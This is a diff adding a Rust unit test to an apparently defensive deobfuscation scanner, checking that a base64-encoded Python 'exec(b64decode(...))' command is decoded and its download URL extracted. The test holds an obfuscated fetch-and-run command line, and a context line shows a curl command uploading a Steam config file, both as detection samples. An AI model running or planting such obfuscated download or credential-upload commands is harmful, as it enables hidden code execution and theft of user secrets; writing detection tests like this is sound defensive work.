@@ -11357,6 +11357,29 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn python_base64_star_import_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let decoded = "import requests;requests.get('https://py.example/star-import-inner')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"python.exe -c "from base64 import *; exec(b64decode('{b64}'))""#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://py.example/star-import-inner"
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python base64 star import source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_dunder_import_base64_recurses_into_decoded_source_urls() {
         use base64::Engine;
 
